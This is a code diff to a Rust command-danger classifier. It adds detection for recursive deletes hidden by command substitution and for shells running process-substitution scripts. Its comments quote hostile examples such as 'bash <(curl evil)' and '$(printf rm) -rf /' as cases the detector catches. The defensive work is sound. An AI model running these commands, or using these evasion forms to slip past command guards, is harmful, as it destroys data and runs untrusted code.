@@ -255,6 +255,24 @@ pub fn classify_danger(command: &str) -> Option<&'static str> {
     if runs_inline_interpreter_code(&scan) {
         return Some("interpreter runs inline code from the command line");
     }
+    // Command substitution in the command-WORD position hides what actually runs
+    // (`` `echo rm` -rf / ``, `$(printf rm) -rf /`). `is_dangerous_rm_target` only
+    // covers substitution in the *target* position, so pair the hidden command
+    // word with a recursive flag and a dangerous target to catch this form.
+    if command_word_uses_substitution(&lower)
+        && tokens.iter().any(|t| is_recursive_delete_flag(t))
+        && tokens
+            .iter()
+            .any(|t| !t.starts_with('-') && is_dangerous_rm_target(t))
+    {
+        return Some("command substitution hides a recursive delete");
+    }
+    // `bash <(curl evil)` / `sh <(echo rm -rf /)`: a shell interpreter handed a
+    // process substitution runs its inner command as a script — the same
+    // download-and-run / hidden-command risk as `| bash`, reached via `<(…)`.
+    if shell_runs_process_substitution(&scan) {
+        return Some("shell runs a process-substitution script");
+    }
     // Windows cmd / PowerShell destructive verbs. The classifier runs on every
     // platform and the Unix vocabulary above never matches these; on Windows the
     // sandbox does not confine the filesystem, so this gate matters most there.
@@ -529,6 +547,50 @@ fn runs_inline_interpreter_code(scan: &str) -> bool {
             return true;
         }
         false
+    })
+}
+
+/// A recursive (optionally force) delete flag: `-rf`, `-r`, `-R`, `--recursive`,
+/// or any short cluster containing both `r` and `f`.
+fn is_recursive_delete_flag(tok: &str) -> bool {
+    matches!(tok, "-rf" | "-fr" | "-r" | "-R" | "--recursive")
+        || (tok.starts_with('-')
+            && !tok.starts_with("--")
+            && tok.contains('r')
+            && tok.contains('f'))
+}
+
+/// True when the command WORD (not an argument) of any segment is built by
+/// command substitution — a backtick or `$(…)` opening the segment's first real
+/// word. The substituted text becomes the command name, so what runs is hidden
+/// at classify time (`` `echo rm` -rf / ``, `$(printf rm) -rf /`).
+fn command_word_uses_substitution(lower: &str) -> bool {
+    lower.split([';', '&', '|', '\n']).any(|seg| {
+        seg.split_whitespace()
+            .map(degroup)
+            .find(|w| !w.is_empty() && !w.starts_with('-') && !is_env_assignment(w))
+            .is_some_and(|w| w.starts_with('`') || w.starts_with("$("))
+    })
+}
+
+/// True when a shell interpreter is handed a process substitution (`bash
+/// <(curl …)`, `sh <(echo rm -rf /)`): the inner command's output becomes a
+/// script the shell runs — the `<(…)` analog of piping into a shell.
+fn shell_runs_process_substitution(scan: &str) -> bool {
+    const SHELLS: &[&str] = &["sh", "bash", "zsh", "dash", "ksh", "fish"];
+    scan.split([';', '&', '|', '\n']).any(|seg| {
+        let words: Vec<&str> = seg.split_whitespace().collect();
+        let Some(cmd) = words
+            .iter()
+            .copied()
+            .map(degroup)
+            .find(|w| !w.is_empty() && !w.starts_with('-') && !is_env_assignment(w))
+        else {
+            return false;
+        };
+        let name = shell_token_command_name(cmd);
+        SHELLS.iter().any(|s| is_versioned_name(&name, s))
+            && words.iter().any(|w| w.contains("<(") || w.contains(">("))
     })
 }
 
